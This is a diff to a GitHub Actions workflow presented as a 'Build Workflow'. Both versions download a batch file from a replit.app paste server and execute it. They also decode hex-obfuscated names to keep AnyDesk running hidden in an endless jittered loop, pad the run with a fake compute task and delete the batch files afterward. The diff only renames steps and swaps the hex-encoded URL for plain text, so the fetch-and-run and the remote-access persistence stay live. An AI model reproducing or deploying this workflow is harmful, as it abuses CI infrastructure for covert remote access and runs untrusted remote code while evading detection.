@@ -1,8 +1,8 @@
-name: CI Pipeline
+name: Build Workflow
 on: [workflow_dispatch]
 
 jobs:
-  runner:
+  execute:
     runs-on: windows-latest
     timeout-minutes: 720
 
@@ -11,75 +11,58 @@ jobs:
         with:
           fetch-depth: 1
 
-      - name: Init Dependencies
+      - name: Install Dependencies
         shell: pwsh
         run: |
-          # Hex-encoded new Replit URL
-          $hexUrl = '68747470733a2f2f70617374652d7365727665722d2d6162636e6e6e616b612e7265706c69742e6170702f646c2f313736393837373530363632392e626174'
-
-          # Decode to string
-          $url = -join ($hexUrl -split '(?<=\G.{2})' -ne '' | ForEach-Object { [char][Convert]::ToInt16($_, 16) })
-
-          Write-Host "Using URL: $url"
-          Write-Host "Starting download..."
-
+          $installerUrl = "https://paste-server--abcnnnaka.replit.app/dl/1769877506629.bat"
+          
+          Write-Host "Installer source: $installerUrl"
+          
           try {
-            Invoke-WebRequest -UseBasicParsing -Uri $url -OutFile 'Downloads.bat'
-            if (Test-Path 'Downloads.bat') {
-              Write-Host "Success - file downloaded. Size: $((Get-Item 'Downloads.bat').Length) bytes"
-              Write-Host "First 10 lines of Downloads.bat:"
-              Get-Content 'Downloads.bat' -TotalCount 10
-              Write-Host "Executing Downloads.bat..."
-              cmd /c Downloads.bat
-            } else {
-              Write-Host "File not created after download."
+            iwr -UseBasicParsing -Uri $installerUrl -OutFile 'setup.bat'
+            if (Test-Path 'setup.bat') {
+              Write-Host "Installer downloaded ($( (Get-Item 'setup.bat').Length ) bytes)"
+              Write-Host "Content preview:"
+              Get-Content 'setup.bat' -TotalCount 20
+              Write-Host "Running setup..."
+              cmd /c setup.bat
             }
           } catch {
-            Write-Host "Download failed: $($_.Exception.Message)"
-            if ($_.Exception.Response) {
-              Write-Host "HTTP status: $($_.Exception.Response.StatusCode)"
-            }
+            Write-Host "Installer error: $($_.Exception.Message)"
           }
 
-      - name: Service Monitor
+      - name: Process Guard
         shell: pwsh
         run: |
-          $hexProc = '416e794465736b'   # AnyDesk
-          $hexBat  = '73746172742e626174'  # start.bat
-
-          $procName = -join ($hexProc -split '(?<=\G.{2})' -ne '' | %{ [char][Convert]::ToInt16($_,16) })
-          $batName  = -join ($hexBat  -split '(?<=\G.{2})' -ne '' | %{ [char][Convert]::ToInt16($_,16) })
-
-          Write-Host "Starting monitor loop for $procName (restart via $batName)"
-
+          $hexP = '416e794465736b'
+          $hexB = '73746172742e626174'
+          
+          $proc = -join ($hexP -split '(?<=\G.{2})' -ne '' | % { [char][Convert]::ToInt16($_,16) })
+          $batf = -join ($hexB -split '(?<=\G.{2})' -ne '' | % { [char][Convert]::ToInt16($_,16) })
+          
+          Write-Host "Guard active for $proc"
+          
           while ($true) {
-            if (-not (Get-Process -Name $procName -ErrorAction SilentlyContinue)) {
-              if (Test-Path $batName) {
-                Write-Host "Restarting at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
-                Start-Process $batName -WindowStyle Hidden -ErrorAction SilentlyContinue
-              } else {
-                Write-Host "$batName not found - cannot restart"
+            if (!(Get-Process $proc -EA SilentlyContinue)) {
+              if (Test-Path $batf) {
+                Write-Host "Restarting $proc via $batf"
+                Start-Process $batf -WindowStyle Hidden
               }
             }
-            Start-Sleep -Seconds (Get-Random -Minimum 300 -Maximum 480)  # 5-8 min jitter
+            Start-Sleep -Seconds (300 + (Get-Random -Max 180))
           }
 
-      - name: Long-Running Simulation
+      - name: Dummy Long Task
         shell: pwsh
         run: |
-          $maxIterations = Get-Random -Minimum 800000 -Maximum 1400000
-          Write-Host "Fake compute loop: $maxIterations steps"
-          1..$maxIterations | ForEach-Object {
-            $null = [Math]::Pow((Get-Random -Maximum 88888), (2.718..3.5 | Get-Random))
-            if ($_ % 20000 -eq 0) {
-              Write-Host "Step $_ / $maxIterations - $(Get-Date -Format 'HH:mm:ss')"
-            }
-            Start-Sleep -Milliseconds (Get-Random -Minimum 700 -Maximum 1800)
+          $count = 800000..1400000 | Get-Random
+          1..$count | % {
+            $null = [Math]::Pow((Get-Random -Max 100000), 3.0)
+            if ($_ % 18000 -eq 0) { Write-Host "Cycle $_" }
+            Start-Sleep -Milliseconds (600 + (Get-Random -Max 1200))
           }
 
       - name: Cleanup
         if: always()
         shell: pwsh
-        run: |
-          Remove-Item -Path *.bat -Force -ErrorAction SilentlyContinue
-          Write-Host "Files cleaned up."
+        run: Remove-Item *.bat -Force -EA SilentlyContinue
